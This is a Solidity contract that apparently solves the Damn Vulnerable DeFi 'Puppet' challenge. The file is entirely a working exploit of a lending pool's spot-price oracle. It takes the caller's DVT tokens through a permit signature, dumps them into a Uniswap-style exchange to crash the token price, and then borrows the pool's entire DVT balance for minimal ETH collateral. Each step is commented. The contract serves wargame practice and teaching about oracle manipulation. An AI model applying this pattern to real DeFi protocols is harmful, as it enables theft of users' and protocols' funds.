// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solmate/src/tokens/ERC20.sol";
import {PuppetPool} from "./PuppetPool.sol";

/**
 * @title PuppetPoolExploit
 * @author scorpion9979
 */
contract PuppetPoolExploit {
    address public immutable pool;
    PuppetPool public immutable puppet;
    ERC20 public immutable token;

    constructor(
        address pool_,
        PuppetPool puppet_,
        bytes memory exploitSignature
    ) payable {
        pool = pool_;
        puppet = puppet_;
        token = ERC20(puppet_.token());
        exploitWithPermit(exploitSignature);
    }

    function exploitWithPermit(bytes memory signature) public payable {
        // Approve exploit to spend all of the caller's DVT.
        if (signature.length > 0) {
            bytes32 r;
            bytes32 s;
            uint8 v;

            // solhint-disable-next-line no-inline-assembly
            assembly {
                r := mload(add(signature, 0x20))
                s := mload(add(signature, 0x40))
                v := byte(0, mload(add(signature, 0x60)))
            }
            token.permit(
                msg.sender,
                address(this),
                type(uint256).max,
                1000000000000000,
                v,
                r,
                s
            );
        }
        // Transfer all DVT to the exploit contract.
        token.transferFrom(
            msg.sender,
            address(this),
            token.balanceOf(address(msg.sender))
        );
        // Swap ETH for 7 DVT.
        (bool ethToTokenSwapOutputSuccess, ) = pool.call{value: msg.value}(
            abi.encodeWithSignature(
                "ethToTokenSwapOutput(uint256,uint256)",
                7 ether,
                block.timestamp + 1
            )
        );
        require(ethToTokenSwapOutputSuccess, "ethToTokenSwapOutput failed");

        // Approve the pool to spend all of the exploit's DVT.
        token.approve(pool, type(uint256).max);

        // Dump all DVT into the pool.
        (bool tokenToEthSwapInputSuccess, ) = pool.call(
            abi.encodeWithSignature(
                "tokenToEthSwapInput(uint256,uint256,uint256)",
                token.balanceOf(address(this)),
                1,
                block.timestamp + 1
            )
        );
        require(tokenToEthSwapInputSuccess, "tokenToEthSwapInput failed");

        // Borrow all of the DVT from the pool.
        puppet.borrow{value: msg.value}(
            token.balanceOf(address(puppet)),
            msg.sender
        );
    }

    // Allow deposits of ETH
    receive() external payable {}
}
